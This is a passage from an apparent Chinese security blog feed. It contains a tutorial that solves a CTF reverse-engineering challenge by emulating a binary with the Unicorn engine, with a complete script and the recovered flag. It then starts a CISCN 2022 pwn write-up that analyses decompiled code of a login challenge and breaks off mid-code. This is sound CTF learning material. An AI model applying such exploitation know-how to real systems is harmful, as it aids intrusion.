read_file(<span class="string">&quot;./fibonacci&quot;</span>))<span class="comment"># 写入程序</span></span><br><span class="line">mu.reg_write(UC_X86_REG_RSP, stack_base+stack_size-<span class="number">1</span>)<span class="comment"># 修改RSP指针</span></span><br></pre></td></tr></table></figure><p>设置程序的加载地址和结束地址，分别为<code>0x4004E0</code>和<code>0x400575</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">start = <span class="number">0x4004E0</span></span><br><span class="line">end = <span class="number">0x400575</span></span><br><span class="line">mu.emu_start(start, end)<span class="comment"># 从start开始执行直至end</span></span><br></pre></td></tr></table></figure><p>我们运行一下脚本，发现报错，说是读到非法的地址：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;try.py&quot;</span>, line 28, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    mu.emu_start(start, end)</span><br><span class="line">  File <span class="string">&quot;/home/fuzz/.local/lib/python3.8/site-packages/unicorn/unicorn.py&quot;</span>, line 525, <span class="keyword">in</span> emu_start</span><br><span class="line">    raise UcError(status)</span><br><span class="line">unicorn.unicorn.UcError: Invalid memory <span class="built_in">read</span> (UC_ERR_READ_UNMAPPED)</span><br></pre></td></tr></table></figure><p>那么是走到哪一步报错了呢？我们需要添加<code>hook</code>将成功执行的代码和其<strong>大小</strong>给打印出来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&#x27;</span> %(address, size))</span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code)<span class="comment"># 添加了hook后每执行一句代码就会执行hook_code内的操作</span></span><br></pre></td></tr></table></figure><p>再次运行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fuzz@fuzz-virtual-machine:~/unicorn-ctf$ python3 try.py </span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e0, instruction size = 0x1</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e1, instruction size = 0x1</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e2, instruction size = 0x2</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e4, instruction size = 0x5</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e9, instruction size = 0x2</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004eb, instruction size = 0x4</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004ef, instruction size = 0x7</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;try.py&quot;</span>, line 34, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    mu.emu_start(start, end)</span><br><span class="line">  File <span class="string">&quot;/home/fuzz/.local/lib/python3.8/site-packages/unicorn/unicorn.py&quot;</span>, line 525, <span class="keyword">in</span> emu_start</span><br><span class="line">    raise UcError(status)</span><br><span class="line">unicorn.unicorn.UcError: Invalid memory <span class="built_in">read</span> (UC_ERR_READ_UNMAPPED)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以得知，程序在执行如下<code>code</code>报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004004EF                 mov     rdi, cs:stdout  ; stream</span><br></pre></td></tr></table></figure><p>因为我们未在空间里引入<code>glibc</code>，所以直接跳过这些函数就好了，除此之外还需跳过的<code>code</code>有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004004F6                 call    _setbuf</span><br><span class="line">.text:0000000000400502                 call    _printf</span><br><span class="line">.text:000000000040054F                 mov     rsi, cs:stdout  ; fp</span><br></pre></td></tr></table></figure><p>可以通过改写<code>rip</code>进行跳过：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mu.reg_write(UC_X86_REG_RIP, address+size)</span><br></pre></td></tr></table></figure><p>当然我们对打印函数也应当进行处理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400558                 movsx   edi, dil        ; c</span><br><span class="line">.text:000000000040055C                 add     rbp, 1</span><br><span class="line">.text:0000000000400560                 call    __IO_putc</span><br></pre></td></tr></table></figure><p><code>__IO_putc</code>将寄存器<code>rdi</code>内的元素进行输出，我们可以对其进行改写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = mu.reg_read(UC_X86_REG_RDI)<span class="comment"># 读出 rdi 里的值进行打印</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(c))</span><br><span class="line">mu.reg_write(UC_X86_REG_RIP, address+size)</span><br></pre></td></tr></table></figure><p>因此<code>hook_code</code>有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">instructions_skip_list = [<span class="number">0x4004EF</span>,<span class="number">0x4004F6</span>,<span class="number">0x400502</span>,<span class="number">0x40054F</span>]<span class="comment"># 跳过glibc函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line">    <span class="comment">#print(&#x27;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&#x27; %(address, size))</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> address <span class="keyword">in</span> instructions_skip_list:</span><br><span class="line">        mu.reg_write(UC_X86_REG_RIP, address+size)</span><br><span class="line">    <span class="keyword">elif</span> address == <span class="number">0x400560</span>:<span class="comment"># 执行到__IO_putc便打印rdi的值，并跳过</span></span><br><span class="line">        c = mu.reg_read(UC_X86_REG_RDI)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(c))</span><br><span class="line">        mu.reg_write(UC_X86_REG_RIP, address+size)</span><br></pre></td></tr></table></figure><p>再次执行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fuzz@fuzz-virtual-machine:~/unicorn-ctf$ python3 try.py </span><br><span class="line">h</span><br><span class="line">x</span><br><span class="line">p</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们发现打印<code>flag</code>依旧很慢，因此就需要开始我们的优化工作</p><h3 id="2-优化程序，提高速度"><a href="#2-优化程序，提高速度" class="headerlink" title="2. 优化程序，提高速度"></a>2. 优化程序，提高速度</h3><p>很显然许多参数以及返回值一样的<code>FIB</code>函数被重复调用了多次，因此我们需要对这些被重复调用过的函数进行记录，当参数一样时，不再经过中间的计算，而直接给出返回值。</p><p>如何保存这些成对的值？</p><ul><li>在函数开始的时候，我们可以检查参数对应的值是否已经被dict记录<ul><li>如果是，直接返回这个key-value就行，只需将返回值写入到<code>RAX</code>中，同时设置<code>RIP</code>为<code>RET</code>指令的值，退出这个函数。不能在<code>fabonacci</code>函数内直接跳转到<code>RET</code>，因为这条指令已经被HOOK了，所以我们跳转到<code>main</code>中的<code>ret</code>。</li><li>如果dict中没有出现参数和对应的值，将参数添加到dict中。</li></ul></li><li>当退出函数的时候，保存返回值。可以从我们的栈结构中读取参数和返回值。</li></ul><p>因此我们需要在执行到<code>FIB</code>函数时进行判断，在<code>FIB</code>返回的时候进行更新，构造如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Fib_entry = <span class="number">0x400670</span></span><br><span class="line">Fib_return = [<span class="number">0x4006F1</span>, <span class="number">0x400709</span>]</span><br><span class="line"></span><br><span class="line">stack = []</span><br><span class="line">d = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line">    <span class="comment">#print(&#x27;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&#x27; %(address, size))</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> address <span class="keyword">in</span> instructions_skip_list:</span><br><span class="line">        mu.reg_write(UC_X86_REG_RIP, address+size)</span><br><span class="line">    <span class="keyword">elif</span> address == <span class="number">0x400560</span>:</span><br><span class="line">        c = mu.reg_read(UC_X86_REG_RDI)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(c))</span><br><span class="line">        mu.reg_write(UC_X86_REG_RIP, address+size)</span><br><span class="line">    <span class="keyword">elif</span> address == Fib_entry:</span><br><span class="line">        arg0 = mu.reg_read(UC_X86_REG_RDI)</span><br><span class="line">        r_rsi = mu.reg_read(UC_X86_REG_RSI)</span><br><span class="line">        arg1 = u32(mu.mem_read(r_rsi,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (arg0,arg1) <span class="keyword">in</span> d:</span><br><span class="line">            (ret_rax, ret_ref) = d[(arg0,arg1)]</span><br><span class="line">            mu.reg_write(UC_X86_REG_RAX, ret_rax)</span><br><span class="line">            mu.mem_write(r_rsi, p32(ret_ref))</span><br><span class="line">            mu.reg_write(UC_X86_REG_RIP,<span class="number">0x400582</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            stack.append((arg0,arg1,r_rsi))</span><br><span class="line">    <span class="keyword">elif</span> address <span class="keyword">in</span> Fib_return:</span><br><span class="line">        (arg0, arg1, r_rsi) = stack.pop()</span><br><span class="line">        ret_rax = mu.reg_read(UC_X86_REG_RAX)</span><br><span class="line">        ret_ref = u32(mu.mem_read(r_rsi,<span class="number">4</span>))</span><br><span class="line">        d[(arg0, arg1)] = (ret_rax, ret_ref)</span><br></pre></td></tr></table></figure><p>再次运行脚本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">fuzz@fuzz-virtual-machine:~/unicorn-ctf$ python3 exp.py </span><br><span class="line">h</span><br><span class="line">x</span><br><span class="line">p</span><br><span class="line">&#123;</span><br><span class="line">F</span><br><span class="line">1</span><br><span class="line">b</span><br><span class="line">0</span><br><span class="line">n</span><br><span class="line">4</span><br><span class="line">c</span><br><span class="line">C</span><br><span class="line">i</span><br><span class="line">_</span><br><span class="line">n</span><br><span class="line">u</span><br><span class="line">m</span><br><span class="line">Z</span><br><span class="line">_</span><br><span class="line">4</span><br><span class="line">r</span><br><span class="line">3</span><br><span class="line">_</span><br><span class="line">T</span><br><span class="line">0</span><br><span class="line">O</span><br><span class="line">_</span><br><span class="line">3</span><br><span class="line">a</span><br><span class="line">5</span><br><span class="line">Y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-完整EXP"><a href="#3-完整EXP" class="headerlink" title="3. 完整EXP"></a>3. 完整EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">u32</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">&quot;I&quot;</span>,data)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p32</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;I&quot;</span>,num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mu = Uc(UC_ARCH_X86, UC_MODE_64)</span><br><span class="line"></span><br><span class="line">prog_base = <span class="number">0x400000</span></span><br><span class="line">stack_base = <span class="number">0x0</span></span><br><span class="line">stack_size = <span class="number">1024</span>*<span class="number">1024</span></span><br><span class="line"></span><br><span class="line">mu.mem_map(prog_base, <span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">mu.mem_map(stack_base, stack_size)</span><br><span class="line"></span><br><span class="line">mu.mem_write(prog_base, read_file(<span class="string">&quot;./fibonacci&quot;</span>))</span><br><span class="line">mu.reg_write(UC_X86_REG_RSP, stack_base+stack_size-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">start = <span class="number">0x4004E0</span></span><br><span class="line">end = <span class="number">0x400575</span></span><br><span class="line"></span><br><span class="line">instructions_skip_list = [<span class="number">0x4004EF</span>,<span class="number">0x4004F6</span>,<span class="number">0x400502</span>,<span class="number">0x40054F</span>]</span><br><span class="line"></span><br><span class="line">Fib_entry = <span class="number">0x400670</span></span><br><span class="line">Fib_return = [<span class="number">0x4006F1</span>, <span class="number">0x400709</span>]</span><br><span class="line"></span><br><span class="line">stack = []</span><br><span class="line">d = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line">    <span class="comment">#print(&#x27;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&#x27; %(address, size))</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> address <span class="keyword">in</span> instructions_skip_list:</span><br><span class="line">        mu.reg_write(UC_X86_REG_RIP, address+size)</span><br><span class="line">    <span class="keyword">elif</span> address == <span class="number">0x400560</span>:</span><br><span class="line">        c = mu.reg_read(UC_X86_REG_RDI)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(c))</span><br><span class="line">        mu.reg_write(UC_X86_REG_RIP, address+size)</span><br><span class="line">    <span class="keyword">elif</span> address == Fib_entry:</span><br><span class="line">        arg0 = mu.reg_read(UC_X86_REG_RDI)</span><br><span class="line">        r_rsi = mu.reg_read(UC_X86_REG_RSI)</span><br><span class="line">        arg1 = u32(mu.mem_read(r_rsi,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (arg0,arg1) <span class="keyword">in</span> d:</span><br><span class="line">            (ret_rax, ret_ref) = d[(arg0,arg1)]</span><br><span class="line">            mu.reg_write(UC_X86_REG_RAX, ret_rax)</span><br><span class="line">            mu.mem_write(r_rsi, p32(ret_ref))</span><br><span class="line">            mu.reg_write(UC_X86_REG_RIP,<span class="number">0x400582</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            stack.append((arg0,arg1,r_rsi))</span><br><span class="line">    <span class="keyword">elif</span> address <span class="keyword">in</span> Fib_return:</span><br><span class="line">        (arg0, arg1, r_rsi) = stack.pop()</span><br><span class="line">        ret_rax = mu.reg_read(UC_X86_REG_RAX)</span><br><span class="line">        ret_ref = u32(mu.mem_read(r_rsi,<span class="number">4</span>))</span><br><span class="line">        d[(arg0, arg1)] = (ret_rax, ret_ref)</span><br><span class="line"></span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">mu.emu_start(start, end)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;结合 ctf赛题 学习一下 unicorn 引擎的基础使用。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://bbs.pediy.com/thread-224330.htm#msg_header_h3_1&quot;&gt;参考文章&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/kabeor/Unicorn-Engine-Documentation/blob/master/Unicorn-Engine%20Documentation.md&quot;&gt;unicorn中文文档&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="other" scheme="http://example.com/categories/other/"/>
    
    
  </entry>
  
  <entry>
    <title>ciscn2022</title>
    <link href="http://example.com/2022/05/30/ciscn2022/"/>
    <id>http://example.com/2022/05/30/ciscn2022/</id>
    <published>2022-05-30T03:41:37.000Z</published>
    <updated>2023-01-18T08:54:33.015Z</updated>
    
    <content type="html"><![CDATA[<p>考研选手来摸鱼。</p><p>今年国赛菜得很快乐，趟得也很快乐~</p><span id="more"></span><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>吐槽：相比于去年啥都不会(当时连堆都没接触过)，今年终于做出题了，虽然不是堆题。堆的 libc 更新太快了，我连 2.27 都没搞明白，2.33、2.34的就来了（老人疑惑</p><h3 id="login-normal"><a href="#login-normal" class="headerlink" title="login_normal"></a>login_normal</h3><p>保护全开。这道题分析好代码就会写了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">1032</span>]; <span class="comment">// [rsp+0h] [rbp-410h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+408h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init_();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x3FF</span>uLL);</span><br><span class="line">    menu(s);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是<code>main</code>函数，就是一个循环，读入输入，看不出啥名堂，进入<code>menu</code>看看。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">menu</span><span class="params">(_BYTE *our_input)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *sa; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sb; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sc; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sd; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+17h] [rbp-39h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+2Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *s1; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> *nptr; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(qword_202040, <span class="number">0</span>, <span class="keyword">sizeof</span>(qword_202040));</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  dest = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !*our_input || *our_input != <span class="number">0xA</span> &amp;&amp; (*our_input != <span class="number">13</span> || our_input[<span class="number">1</span>] != <span class="number">10</span>) )  <span class="comment">//遇&#x27;\n&#x27;跳出</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )                              <span class="comment">// 6次机会read</span></span><br><span class="line">      qword_202040[<span class="number">2</span> * v8] = our_input;</span><br><span class="line">    sb = <span class="built_in">strchr</span>(our_input, <span class="string">&#x27;:&#x27;</span>);                <span class="comment">// 寻找&#x27;:&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> ( !sb )                                  <span class="comment">// 找不到就报错</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;<span class="comment">//**这里说明我们的输入必须要包含一个&#x27;:&#x27;</span></span><br><span class="line">    *sb = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( sc = sb + <span class="number">1</span>; *sc &amp;&amp; (*sc == <span class="string">&#x27; &#x27;</span> || *sc == <span class="string">&#x27;\r&#x27;</span> || *sc == <span class="string">&#x27;\n&#x27;</span> || *sc == <span class="string">&#x27;\t&#x27;</span>); ++sc )</span><br><span class="line">      *sc = <span class="number">0</span>;                                  <span class="comment">// 从&#x27;:&#x27;后一位寻找内容</span></span><br><span class="line">    <span class="keyword">if</span> ( !*sc )                                 <span class="comment">// 若输入内容包含特殊字符就报错</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;abort.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;<span class="comment">//**这里说明&#x27;:&#x27;后一位不准跟特殊字符</span></span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">      qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>] = sc;</span><br><span class="line">    sd = <span class="built_in">strchr</span>(sc, <span class="number">10</span>);<span class="comment">// 寻找&#x27;\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> ( !sd )   <span class="comment">// 找不到就报错</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;<span class="comment">//**这里说明内容后面必须有&#x27;\n&#x27;</span></span><br><span class="line">    *sd = <span class="number">0</span>;</span><br><span class="line">    our_input = sd + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *our_input == <span class="number">13</span> )</span><br><span class="line">      *our_input++ = <span class="number">0</span>;</span><br><span class="line">    s1 = qword_202040[<span class="number">2</span> * v8];                  <span class="comment">// s1为&#x27;:&#x27;前的字符串</span></span><br><span class="line">    nptr = qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>];            <span class="comment">// nptr为&#x27;:&#x27;后的字符串</span></span><br><span class="line">    <span class="keyword">if</span> ( 